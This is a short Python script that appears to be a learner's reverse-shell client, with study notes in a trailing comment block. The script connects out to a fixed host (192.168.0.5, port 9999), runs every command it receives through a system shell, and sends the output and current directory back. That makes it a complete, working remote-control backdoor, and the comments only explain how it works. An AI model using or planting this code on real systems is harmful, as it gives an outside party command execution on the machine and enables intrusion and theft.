import os
import socket
import subprocess


s = socket.socket()
host = '192.168.0.5'
port = 9999
s.connect((host, port))


while True:
    data = s.recv(1024)
    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))
    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output_bytes = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_bytes, "utf-8")
        s.send(str.encode(output_str + str(os.getcwd()) + '> '))
        print(output_str)


# closing connection

s.close()


'''
create a socket at this end and connect it to server's IP and Port using s.connect()
by passing a tuple of addresses as argument.

os module : provides a way of using 'OPERATING SYSTEM' dependent functionality.The functions
that the OS module provides allows you to interface
with the underlying operating system that Python is running on be that Windows,
Mac or Linux.

client side socket port number will be randomly assigned by the OS.
2^16-1 = 65535(including 0)

If it is 'cd' we ask the OS to change the directory. Because it doesnt give us any data it just changes
the directory

if length of the data(command received) is greater than 0 that means we have a command.
we create a subprocess and
" All the input and output to that are through standard stream(stdout,stdin,stderr) so we use PIPE"
// very very important

Then we use output in both bytes and string.
and we have to send in bytes + the path + >

If the len(data) is NOT greater than 0, then that if FAILS. so



'''

